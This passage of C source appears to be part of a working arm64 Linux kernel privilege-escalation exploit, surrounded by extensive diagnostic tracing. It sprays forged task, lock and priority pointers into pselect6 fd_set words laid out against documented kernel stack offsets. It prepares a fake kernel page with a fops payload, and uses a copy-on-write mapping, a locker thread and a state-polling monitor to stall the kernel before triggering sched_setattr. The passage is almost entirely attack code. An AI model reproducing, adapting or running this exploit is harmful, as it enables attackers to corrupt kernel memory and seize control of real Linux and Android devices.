        polls == 1 || last_state != previous_state;
    if ((schedstat_active_before || schedstat_active_after) &&
        ((polls % 4) == 0 || waiter_state_changed || task_state == 'D')) {
      readiness_schedstat_record(&monitor->waiter_schedstat,
                                 waiter_schedstat_fd, task_state, polls,
                                 schedstat_active_after);
    }
#endif
#if defined(RMG_DIAG_READINESS_STATE_TRACE)
    if (polls == 1 || last_state != previous_state) {
      int gate = atomic_load_explicit(&monitor->trigger_gate,
                                      memory_order_acquire);
      int pselect_active = atomic_load_explicit(&monitor->pselect_active,
                                                memory_order_acquire);
      readiness_monitor_state_mark(monitor, 0, monitor->tid, task_state,
                                   polls, gate, pselect_active, sched_getcpu(),
                                   readiness_now_us());
    }
#endif
#if defined(RMG_DIAG_PI_HELPER_STATE_TRACE_ACTIVE)
    char helper_state = readiness_task_state(helper_fd);
    if (atomic_load_explicit(&monitor->stop, memory_order_acquire))
      break;
    unsigned long long helper_polls = ++monitor->helper_polls;
    int previous_helper_state = monitor->helper_last_state;
    monitor->helper_last_state =
        (int)(unsigned char)helper_state;
    if (helper_polls == 1)
      monitor->helper_first_state = monitor->helper_last_state;
    if (helper_polls == 1 ||
        monitor->helper_last_state != previous_helper_state) {
      int gate = atomic_load_explicit(&monitor->trigger_gate,
                                      memory_order_acquire);
      int pselect_active = atomic_load_explicit(&monitor->pselect_active,
                                                memory_order_acquire);
      readiness_monitor_state_mark(
          monitor, 1, monitor->helper_tid, helper_state, helper_polls, gate,
          pselect_active, sched_getcpu(), readiness_now_us());
    }
#if defined(RMG_DIAG_LIVE_HELPER_SYSCALL_TRACE) && \
    RMG_DIAG_LIVE_HELPER_SYSCALL_TRACE
    int helper_trigger_gate = atomic_load_explicit(
        &monitor->trigger_gate, memory_order_acquire);
    int helper_trigger_pselect_active = atomic_load_explicit(
        &monitor->pselect_active, memory_order_acquire);
    if (!monitor->live_d_helper_syscall_captured &&
        helper_state == 'D' && helper_trigger_gate &&
        helper_trigger_pselect_active) {
      monitor->live_d_helper_syscall_captured = 1;
      readiness_trace_live_helper_syscall(monitor, helper_polls, fd,
                                          "helper-D");
    }
#endif
#if defined(RMG_DIAG_LIVE_HELPER_WCHAN_TRACE) && \
    RMG_DIAG_LIVE_HELPER_WCHAN_TRACE
    int helper_wchan_gate = atomic_load_explicit(
        &monitor->trigger_gate, memory_order_acquire);
    int helper_wchan_pselect_active = atomic_load_explicit(
        &monitor->pselect_active, memory_order_acquire);
    if (helper_state == 'D' && helper_wchan_gate)
      helper_d_streak++;
    else
      helper_d_streak = 0;
    if (!monitor->live_d_helper_wchan_captured && helper_d_streak >= 2) {
      monitor->live_d_helper_wchan_captured = 1;
      readiness_trace_live_helper_wchan(
          monitor, helper_polls, fd, helper_d_streak, helper_wchan_gate,
          helper_wchan_pselect_active);
    }
#endif
#if defined(RMG_DIAG_SCHEDSTAT_TRACE) && RMG_DIAG_SCHEDSTAT_TRACE
    int helper_pselect_active = atomic_load_explicit(
        &monitor->pselect_active, memory_order_acquire);
    int helper_state_changed =
        helper_polls == 1 ||
        monitor->helper_last_state != previous_helper_state;
    if ((schedstat_active_before || schedstat_active_after ||
         helper_pselect_active) &&
        ((helper_polls % 4) == 0 || helper_state_changed ||
         helper_state == 'D')) {
      readiness_schedstat_record(&monitor->helper_schedstat,
                                 helper_schedstat_fd, helper_state,
                                 helper_polls, helper_pselect_active);
    }
#endif
    if (helper_state == 'D')
      monitor->helper_blocked_samples++;
#endif
#if defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && RMG_DIAG_PASSIVE_COW_OBSERVER
    if (passive_sample_due && passive_gate_before && passive_active_before &&
        passive_gate_after && passive_active_after) {
      int sampled_state = (int)(unsigned char)task_state;
      int previous_pselect_state = monitor->pselect_last_state;
      unsigned long long pselect_sample = ++monitor->pselect_state_samples;
      int observer_cpu = sched_getcpu();
      if (pselect_sample == 1) {
        monitor->pselect_first_state = sampled_state;
        monitor->pselect_first_sample_us = passive_sample_at_us;
        monitor->pselect_first_observer_cpu = observer_cpu;
      }
      monitor->pselect_last_state = sampled_state;
      monitor->pselect_last_sample_us = passive_sample_at_us;
      monitor->pselect_last_observer_cpu = observer_cpu;
      if (pselect_sample == 1 || sampled_state != previous_pselect_state) {
        readiness_monitor_state_mark(
            monitor, 0, monitor->tid, task_state, polls, passive_gate_after,
            passive_active_after, observer_cpu, passive_sample_at_us);
      }
    }
#endif
#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
    char locker_state = readiness_task_state(locker_fd);
    if (atomic_load_explicit(&monitor->stop, memory_order_acquire))
      break;
    unsigned long long locker_polls = ++monitor->locker_polls;
    int previous_locker_state = monitor->locker_last_state;
    monitor->locker_last_state = (int)(unsigned char)locker_state;
    if (locker_polls == 1)
      monitor->locker_first_state = monitor->locker_last_state;
    if (locker_polls == 1 ||
        monitor->locker_last_state != previous_locker_state) {
      int gate = atomic_load_explicit(&monitor->trigger_gate,
                                      memory_order_acquire);
      int pselect_active = atomic_load_explicit(&monitor->pselect_active,
                                                memory_order_acquire);
      readiness_monitor_state_mark(
          monitor, 1,
          atomic_load_explicit(&monitor->locker_tid, memory_order_acquire),
          locker_state, locker_polls, gate, pselect_active, sched_getcpu(),
          readiness_now_us());
    }
    if (locker_state == 'D') {
      int gate = atomic_load_explicit(&monitor->trigger_gate,
                                      memory_order_acquire);
      int pselect_active = atomic_load_explicit(&monitor->pselect_active,
                                                memory_order_acquire);
      monitor->locker_blocked_samples++;
      readiness_record_locker_block_sample(monitor, locker_state,
                                           locker_polls, gate,
                                           pselect_active);
    }
#endif
    if (atomic_load_explicit(&monitor->trigger_gate,
                             memory_order_acquire) && task_state == 'R' &&
        !atomic_exchange_explicit(&monitor->runnable_after_gate, 1,
                                  memory_order_acq_rel)) {
#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
      monitor->runnable_after_gate_polls = polls;
#endif
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
      readiness_trace_mark(READINESS_TRACE_POST_GATE_RUNNABLE,
                           (int)polls);
#endif
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
      rmg_diag_checkpoint("readiness-monitor-post-gate-runnable",
                          monitor->tid, polls);
#endif
    }
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
    if (polls == 1) {
      readiness_trace_mark(READINESS_TRACE_MONITOR_FIRST_STATE,
                           (int)(unsigned char)task_state);
      monitor->first_state = first_state;
      atomic_store_explicit(&monitor->sample_ready, 1,
                            memory_order_release);
    }
#endif
    if (task_state == 'D') {
      int trigger_gate = atomic_load_explicit(&monitor->trigger_gate,
                                              memory_order_acquire);
      int runnable_after_gate = atomic_load_explicit(
          &monitor->runnable_after_gate, memory_order_acquire);
      int pselect_active = atomic_load_explicit(&monitor->pselect_active,
                                                memory_order_acquire);
#if defined(RMG_DIAG_LIVE_WCHAN_TRACE) && RMG_DIAG_LIVE_WCHAN_TRACE
      if (!monitor->live_d_wchan_captured && trigger_gate &&
          runnable_after_gate && pselect_active) {
        monitor->live_d_wchan_captured = 1;
        readiness_trace_live_d_wchan(monitor, task_state, polls,
                                     trigger_gate, runnable_after_gate,
                                     pselect_active, fd);
      }
#endif
#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
      if (!monitor->block_seen)
        readiness_record_block_sample(monitor, task_state, polls,
                                      trigger_gate, runnable_after_gate,
                                      pselect_active, fd);
#endif
      if (!trigger_gate) {
        atomic_store_explicit(&monitor->pre_gate_block, 1,
                              memory_order_release);
#if !defined(RMG_DIAG_COW_ONLY) || !RMG_DIAG_COW_ONLY
        readiness_log_task_wchan(monitor->tid);
#endif
        pr_info("readiness monitor pre-gate block tid=%d polls=%llu "
                "gate=%d runnable_after_gate=%d\n",
                monitor->tid, polls, trigger_gate, runnable_after_gate);
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
        readiness_trace_mark(READINESS_TRACE_MONITOR_BLOCKED,
                             (int)polls);
#endif
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
        rmg_diag_checkpoint("readiness-monitor-pre-gate-block",
                            monitor->tid, polls);
#endif
        break;
      }
      if (!runnable_after_gate) {
        if (!pselect_active ||
            !atomic_load_explicit(&monitor->pselect_active,
                                  memory_order_acquire)) {
          monitor->post_pselect_block = 1;
          monitor->post_pselect_block_polls = polls;
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
          readiness_trace_mark(READINESS_TRACE_MONITOR_POST_PSELECT,
                               (int)polls);
#endif
        }
        atomic_store_explicit(&monitor->pre_gate_block, 1,
                              memory_order_release);
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
        readiness_trace_mark(READINESS_TRACE_MONITOR_BLOCKED, (int)polls);
#endif
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
        rmg_diag_checkpoint("readiness-monitor-block-before-runnable",
                            monitor->tid, polls);
#endif
        break;
      }
      /* A D-state sample counts as the intended waitpoint only while the
       * target is still inside pselect. Recheck after sampling so later
       * diagnostic proc reads cannot be mistaken for the COW fault. */
      int pselect_active_after_sample = atomic_load_explicit(
          &monitor->pselect_active, memory_order_acquire);
      if (!pselect_active || !pselect_active_after_sample) {
        monitor->post_pselect_block = 1;
        monitor->post_pselect_block_polls = polls;
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
        readiness_trace_mark(READINESS_TRACE_MONITOR_POST_PSELECT,
                             (int)polls);
#endif
        break;
      }
      blocked_samples++;
      atomic_store_explicit(&monitor->saw_block, 1, memory_order_release);
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
      readiness_trace_mark(READINESS_TRACE_MONITOR_BLOCKED, (int)polls);
#endif
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
      rmg_diag_checkpoint("readiness-monitor-blocked", monitor->tid, polls);
#endif
#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
      rmg_diag_checkpoint("readiness-monitor-sched-skipped", monitor->tid,
                          polls);
#endif
      continue;
#else
      if (!atomic_load_explicit(&monitor->pselect_active,
                                memory_order_acquire)) {
        monitor->post_pselect_block = 1;
        monitor->post_pselect_block_polls = polls;
        monitor->sched_ret = -1;
        monitor->sched_errno = ECANCELED;
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
        readiness_trace_mark(READINESS_TRACE_MONITOR_POST_PSELECT,
                             (int)polls);
#endif
        break;
      }
      atomic_fetch_add(&consumer_calls, 1);
#if (defined(RMG_DIAG_PI_PROBE_ONLY) && RMG_DIAG_PI_PROBE_ONLY) || \
    (defined(RMG_DIAG_CFI_ONLY) && RMG_DIAG_CFI_ONLY)
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
      rmg_diag_checkpoint("readiness-monitor-sched-enter", monitor->tid,
                          polls);
#endif
      long long start_us = readiness_now_us();
      errno = 0;
#if defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) && RMG_DIAG_UCLAMP_TRIGGER_ONLY
      monitor->sched_ret =
          sched_setattr_tid_uclamp_nochange(monitor->tid);
#else
      monitor->sched_ret = sched_setattr_tid_nochange(monitor->tid);
#endif
#else
      int nice = monitor->seq * 7;
      if (nice > 19)
        nice = 19;
      long long start_us = readiness_now_us();
      errno = 0;
      monitor->sched_ret = sched_setattr_tid(monitor->tid, nice);
#endif
      monitor->sched_errno = errno;
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
      rmg_diag_checkpoint("readiness-monitor-sched",
                          (unsigned long long)monitor->sched_ret,
                          monitor->sched_errno);
#endif
      long long walk_us = readiness_now_us() - start_us;
      if (walk_us < 0)
        walk_us = 0;
      if (walk_us > 1000000)
        walk_us = 1000000;
      atomic_store(&consumer_walk_us, (int)walk_us);
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
      rmg_diag_checkpoint("readiness-monitor-sched-time",
                          (unsigned long long)walk_us, monitor->tid);
#endif
      if (monitor->sched_ret == 0)
        atomic_fetch_add(&consumer_success, 1);
      break;
#endif
    }
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    if (polls % 10000 == 0)
      rmg_diag_checkpoint("readiness-monitor-progress", polls,
                          (unsigned long long)(unsigned char)task_state);
#endif
  }

  monitor->polls = polls;
  monitor->blocked_samples = blocked_samples;
  monitor->first_state = first_state;
  monitor->last_state = last_state;
  close(fd);
#if defined(RMG_DIAG_SCHEDSTAT_TRACE) && RMG_DIAG_SCHEDSTAT_TRACE
  readiness_schedstat_flush(&monitor->waiter_schedstat, "waiter",
                            monitor->tid, monitor->seq);
  if (waiter_schedstat_fd >= 0)
    close(waiter_schedstat_fd);
#endif
#if defined(RMG_DIAG_PI_HELPER_STATE_TRACE_ACTIVE)
  pr_info("readiness mprotect-helper observer tid=%d open_errno=%d "
          "polls=%llu blocked_samples=%llu first_state=%d last_state=%d\n",
          monitor->helper_tid, monitor->helper_open_errno,
          monitor->helper_polls, monitor->helper_blocked_samples,
          monitor->helper_first_state, monitor->helper_last_state);
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  char helper_detail[128];
  snprintf(helper_detail, sizeof(helper_detail),
           "open_errno=%d,polls=%llu,blocked_samples=%llu,first_state=%d,last_state=%d",
           monitor->helper_open_errno, monitor->helper_polls,
           monitor->helper_blocked_samples, monitor->helper_first_state,
           monitor->helper_last_state);
  rmg_diag_checkpoint_text("readiness-monitor-helper-summary",
                           monitor->helper_tid, monitor->helper_polls,
                           helper_detail);
#endif
  close(helper_fd);
#if defined(RMG_DIAG_SCHEDSTAT_TRACE) && RMG_DIAG_SCHEDSTAT_TRACE
  readiness_schedstat_flush(&monitor->helper_schedstat,
                            "mprotect-helper", monitor->helper_tid,
                            monitor->seq);
  if (helper_schedstat_fd >= 0)
    close(helper_schedstat_fd);
#endif
#endif
#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
  close(locker_fd);
#endif
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("readiness-monitor-exit",
                      atomic_load(&monitor->saw_block), polls);
#endif
  return NULL;
}

void do_readiness_pause_route(void) {
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("readiness-route-start",
                      PSELECT_CFI_ROUTE_ATTEMPTS, page_base);
#endif
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("readiness-route-invalid", page_base, fake_lock);
#endif
    pr_error("readiness-pause route missing page=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("readiness-attempt-start", route_attempt, page_base);
#endif
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
      rmg_diag_checkpoint("readiness-page-refresh", route_attempt, page_base);
#endif
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
        rmg_diag_checkpoint("readiness-page-refresh-failed", cfi_last_step,
                            cfi_last_errno);
#endif
        break;
      }
    }

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    /* The COW monitor performs the one sched_setattr itself. Stop the
     * generic spinning consumer so it cannot steal the waiter's CPU. */
    atomic_store(&punch_consume_stop, 1);
    atomic_store(&main_route_delay_usec, 0);
    atomic_store(&punch_consume_go, 0);

    /* PSELECT6 GEOMETRY (stack_fds = SP0-0x210):
     * The asm stub uses pselect6 (arm64 has no __NR_select).
     * __arm64_sys_pselect6(0x10) + __do_sys_pselect6(0x90) = 0xA0
     * before core_sys_select(0x1C0), so stack_fds = SP0-0x210.
     *
     *  tree_entry.pc    SP0-0x198 = res_readfds  word 0 -> MUST be 0
     *  tree_entry.right SP0-0x190 = res_readfds  word 1 -> MUST be 0
     *  tree_entry.left  SP0-0x188 = res_readfds  word 2 -> MUST be 0
     *  pi_tree.pc       SP0-0x180 = res_readfds  word 3 -> MUST be 0
     *  pi_tree.right    SP0-0x178 = res_readfds  word 4 -> MUST be 0
     *  pi_tree.left     SP0-0x170 = res_writefds word 0 -> MUST be 0
     *  task             SP0-0x168 = res_writefds word 1 -> SPRAY (fds 64-127 WRITE)
     *  lock             SP0-0x160 = res_writefds word 2 -> SPRAY (fds 128-191 WRITE)
     *  prio             SP0-0x158 = res_writefds word 3 -> SPRAY (fds 192-255 WRITE)
     *
     * Don't watch ANY fds for reading (tree/pi_tree = res_readfds = 0).
     * Watch fds 64-255 for writing (write-ready pipes for task/lock/prio).
     * Don't watch fds 0-63 for writing (pi_tree.left = res_writefds word 0 = 0).
     */
    fd_set in, out, ex;
    FD_ZERO(&in);
    FD_ZERO(&out);
    FD_ZERO(&ex);

    /* WRITE-readiness spray: in_writefds word 1 = fake_task bits (fds 64-127),
     * word 2 = fake_lock bits (fds 128-191), word 3 = prio bits (fds 192-255).
     * The pipe WRITE-ends at those positions are writable (POLLOUT). */
    fdset_put_word(&out, 1, (uint64_t)fake_task);
    fdset_put_word(&out, 2, (uint64_t)fake_lock);
    fdset_put_word(&out, 3, (uint64_t)(page_base + LOCK_OFF + 0x100));

    {
      char m[128];
      int n = snprintf(m, sizeof(m),
          "[OVERLAY] readiness-cow attempt=%d lock=%016zx task=%016zx psel-geom\n",
          route_attempt, fake_lock, fake_task);
      syscall(SYS_write, 2, m, n);
    }

    /* DEBUG: verify the pipe craft before putting the bitmap in a COW map. */
    {
      fd_set test_out;
      memcpy(&test_out, &out, sizeof(test_out));
      struct timeval tv = {0, 0};
      errno = 0;
      int test_ret = select(PSELECT_ROUTE_NFDS, NULL, &test_out, NULL, &tv);
      int test_errno = test_ret < 0 ? errno : 0;
      uint64_t w1 = 0, w2 = 0, w3 = 0;
      memcpy(&w1, (char *)&test_out + 1*8, 8);
      memcpy(&w2, (char *)&test_out + 2*8, 8);
      memcpy(&w3, (char *)&test_out + 3*8, 8);
      uint64_t expected_w3 =
          (uint64_t)(page_base + LOCK_OFF + 0x100);
      char dm[256];
      int dn = snprintf(dm, sizeof(dm),
          "[SPRAY-DBG] test select ret=%d w1=%016llx w2=%016llx w3=%016llx\n"
          "            want task=%016llx lock=%016llx prio=%016llx errno=%d\n",
          test_ret, (unsigned long long)w1, (unsigned long long)w2,
          (unsigned long long)w3,
          (unsigned long long)fake_task, (unsigned long long)fake_lock,
          (unsigned long long)expected_w3, test_errno);
      syscall(SYS_write, 2, dm, dn);
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
      rmg_diag_checkpoint("fdset-preflight-ret-errno",
                          (unsigned long long)(long long)test_ret,
                          (unsigned long long)test_errno);
      rmg_diag_checkpoint("fdset-preflight-words-1-2", w1, w2);
      rmg_diag_checkpoint("fdset-preflight-word3-task", w3,
                          (unsigned long long)fake_task);
      rmg_diag_checkpoint("fdset-preflight-want-lock-prio",
                          (unsigned long long)fake_lock, expected_w3);
#endif
#if defined(RMG_DIAG_FDSET_PREFLIGHT_ONLY) && \
    RMG_DIAG_FDSET_PREFLIGHT_ONLY
      cfi_last_step = 43;
      cfi_last_errno = test_errno;
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
      rmg_diag_checkpoint("fdset-preflight-stop-before-cow", test_ret,
                          test_errno);
#endif
      pr_info("fdset preflight stopped before COW and scheduler stages\n");
      return;
#endif
    }

    int cow_fd = -1;
    size_t cow_len = 0;
    fd_set *cow_out = readiness_map_cow_fdset(&out, &cow_fd, &cow_len);
    struct readiness_cow_ctx cow_ctx = {0};
    atomic_init(&cow_ctx.start, 0);
    atomic_init(&cow_ctx.entered, 0);
    atomic_init(&cow_ctx.tid, 0);
    atomic_init(&cow_ctx.abort, 0);
    atomic_init(&cow_ctx.release_mprotect, 0);
    atomic_init(&cow_ctx.mprotect_started, 0);
    atomic_init(&cow_ctx.stop_mprotect, 0);
    atomic_init(&cow_ctx.done, 0);
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("readiness-cow-setup-start", route_attempt,
                        cow_len);
#endif
    if (!cow_out || !readiness_prepare_pte_region(&cow_ctx)) {
      cfi_last_step = 35;
      cfi_last_errno = errno;
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
      rmg_diag_checkpoint("readiness-cow-setup-failed", route_attempt,
                          cfi_last_errno);
#endif
      if (cow_out)
        munmap(cow_out, cow_len);
      if (cow_fd >= 0)
        close(cow_fd);
      pr_error("readiness COW setup failed errno=%d\n", cfi_last_errno);
      break;
    }
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("readiness-cow-setup-done", route_attempt,
                        cow_ctx.region_len);
#endif

    struct readiness_block_monitor monitor = {
      .tid = atomic_load(&waiter_tid),
      .seq = route_attempt,
    };
#if defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && RMG_DIAG_PASSIVE_COW_OBSERVER
    monitor.observer_core = -1;
    monitor.helper_core = -1;
    monitor.pselect_first_state = -1;
    monitor.pselect_last_state = -1;
    monitor.pselect_first_observer_cpu = -1;
    monitor.pselect_last_observer_cpu = -1;
#endif
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
    int soft_dirty_clear_ret = -1;
    int soft_dirty_clear_errno = 0;
    int pagemap_ret = -1;
    int pagemap_errno = 0;
    unsigned long long cow_pagemap_entry = 0;
    int cow_pagemap_before_ret = -1;
    int cow_pagemap_before_errno = 0;
    unsigned long long cow_pagemap_before_entry = 0;
    int soft_dirty_control_write = -1;
    int soft_dirty_control_pagemap_ret = -1;
    int soft_dirty_control_pagemap_errno = 0;
    unsigned long long cow_control_pagemap_entry = 0;
    struct readiness_anon_soft_dirty_probe anon_soft_dirty = {0};
    struct readiness_smaps_snapshot smaps_before = {0};
    struct readiness_smaps_snapshot smaps_after_pselect = {0};
    struct readiness_smaps_snapshot smaps_after_control = {0};
#endif
    atomic_init(&monitor.ready, 0);
    atomic_init(&monitor.armed, 0);
    atomic_init(&monitor.trigger_gate, 0);
    atomic_init(&monitor.runnable_after_gate, 0);
    atomic_init(&monitor.pselect_active, 0);
    atomic_init(&monitor.pre_gate_block, 0);
    atomic_init(&monitor.sample_ready, 0);
    atomic_init(&monitor.stop, 0);
    atomic_init(&monitor.saw_block, 0);
#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
    atomic_init(&monitor.locker_tid, 0);
    atomic_init(&monitor.locker_stat_ready, 0);
    monitor.locker_stat_fd = -1;
    atomic_init(&monitor.pselect_call_started, 0);
#endif
#if defined(RMG_DIAG_PI_HELPER_STATE_TRACE_ACTIVE)
    atomic_init(&monitor.helper_stat_ready, 0);
    monitor.helper_tid = 0;
    monitor.helper_stat_fd = -1;
    monitor.helper_open_errno = 0;
    monitor.helper_polls = 0;
    monitor.helper_blocked_samples = 0;
    monitor.helper_first_state = 0;
    monitor.helper_last_state = 0;
#endif
#if defined(RMG_DIAG_LIVE_HELPER_SYSCALL_TRACE) && \
    RMG_DIAG_LIVE_HELPER_SYSCALL_TRACE
    monitor.live_d_helper_syscall_captured = 0;
#endif
#if defined(RMG_DIAG_LIVE_HELPER_WCHAN_TRACE) && \
    RMG_DIAG_LIVE_HELPER_WCHAN_TRACE
    monitor.live_d_helper_wchan_captured = 0;
#endif
#if defined(RMG_DIAG_READINESS_STATE_TRACE)
    atomic_init(&monitor.state_trace_count, 0);
#endif
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
    readiness_trace_reset();
    long long clear_refs_start_us = readiness_now_us();
    errno = 0;
    soft_dirty_clear_ret = readiness_clear_soft_dirty();
    soft_dirty_clear_errno = soft_dirty_clear_ret == 0 ? 0 : errno;
    long long clear_refs_us = readiness_now_us() - clear_refs_start_us;
    pr_info("readiness clear_refs result=%d errno=%d elapsed_us=%lld\n",
            soft_dirty_clear_ret, soft_dirty_clear_errno, clear_refs_us);
    readiness_read_smaps(cow_out, &smaps_before);
    pr_info("readiness smaps-before result=%d errno=%d anonymous_kb=%llu "
            "private_dirty_kb=%llu\n",
            smaps_before.ret, smaps_before.err,
            smaps_before.anonymous_kb, smaps_before.private_dirty_kb);
    errno = 0;
    cow_pagemap_before_ret = readiness_read_pagemap_entry(
        cow_out, &cow_pagemap_before_entry);
    cow_pagemap_before_errno = cow_pagemap_before_ret == 0 ? 0 : errno;
#endif

    pthread_t mmap_locker;
    pthread_t block_monitor;
    int monitor_started = 0;
    int mmap_locker_started = 0;
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("readiness-monitor-start", route_attempt,
                        monitor.tid);
#endif
    int thread_err = pthread_create(&block_monitor, NULL,
                                    readiness_block_monitor_thread, &monitor);
    if (thread_err == 0) {
      monitor_started = 1;
      while (!atomic_load_explicit(&monitor.ready, memory_order_acquire))
        __asm__ volatile("yield" ::: "memory");
      if (monitor.open_errno)
        thread_err = monitor.open_errno;
#if defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && RMG_DIAG_PASSIVE_COW_OBSERVER
      else if (monitor.observer_affinity_errno)
        thread_err = monitor.observer_affinity_errno;
#endif
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
      rmg_diag_checkpoint("readiness-monitor-ready", route_attempt,
                          thread_err);
#endif
    }
    if (thread_err == 0) {
      thread_err = pthread_create(&mmap_locker, NULL,
                                  readiness_mmap_lock_thread, &cow_ctx);
      if (thread_err == 0) {
        mmap_locker_started = 1;
#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
        int locker_tid = 0;
        while (!(locker_tid = atomic_load_explicit(&cow_ctx.tid,
                                                    memory_order_acquire)))
          __asm__ volatile("yield" ::: "memory");
        atomic_store_explicit(&monitor.locker_tid, locker_tid,
                              memory_order_release);
        monitor.locker_stat_fd = readiness_open_task_stat(locker_tid);
        if (monitor.locker_stat_fd < 0) {
          monitor.locker_open_errno = errno;
          thread_err = monitor.locker_open_errno;
        } else {
          atomic_store_explicit(&monitor.locker_stat_ready, 1,
                                memory_order_release);
          pr_info("readiness monitor task ids waiter=%d mprotect_helper=%d\n",
                  monitor.tid, locker_tid);
        }
#endif
#if defined(RMG_DIAG_PI_HELPER_STATE_TRACE_ACTIVE)
        int helper_tid = 0;
        while (!(helper_tid = atomic_load_explicit(&cow_ctx.tid,
                                                    memory_order_acquire)))
          __asm__ volatile("yield" ::: "memory");
        monitor.helper_tid = helper_tid;
        monitor.helper_stat_fd = readiness_open_task_stat(helper_tid);
        if (monitor.helper_stat_fd < 0) {
          monitor.helper_open_errno = errno;
          thread_err = monitor.helper_open_errno;
        } else {
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
          rmg_diag_checkpoint("readiness-monitor-helper-open", helper_tid,
                              monitor.helper_stat_fd);
#endif
          atomic_store_explicit(&monitor.helper_stat_ready, 1,
                                memory_order_release);
          pr_info("readiness monitor task ids waiter=%d mprotect_helper=%d\n",
                  monitor.tid, helper_tid);
        }
#endif
      }
    }
    if (thread_err != 0) {
      cfi_last_step = 36;
      cfi_last_errno = thread_err;
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
      rmg_diag_checkpoint("readiness-thread-setup-failed", route_attempt,
                          thread_err);
#endif
      atomic_store(&monitor.stop, 1);
      if (monitor_started)
        pthread_join(block_monitor, NULL);
#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
      readiness_log_block_wchan_snapshot(&monitor);
#endif
      if (mmap_locker_started) {
        atomic_store_explicit(&cow_ctx.abort, 1, memory_order_release);
        atomic_store_explicit(&cow_ctx.start, 1, memory_order_release);
        pthread_join(mmap_locker, NULL);
      }
#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
      readiness_log_locker_block_wchan_snapshot(&monitor);
#endif
      munmap(cow_ctx.region, cow_ctx.region_len);
      munmap(cow_out, cow_len);
      close(cow_fd);
      pr_error("readiness blocker thread failed errno=%d\n", thread_err);
      break;
    }
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("readiness-locker-ready", route_attempt, 0);
#endif

    atomic_store_explicit(&cow_ctx.start, 1, memory_order_release);
    while (!atomic_load_explicit(&cow_ctx.entered, memory_order_acquire))
      __asm__ volatile("yield" ::: "memory");
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
    /* Keep the monitor idle during clear_refs/smaps and locker setup. Begin
     * sampling only after the mmap helper is ready, immediately before its
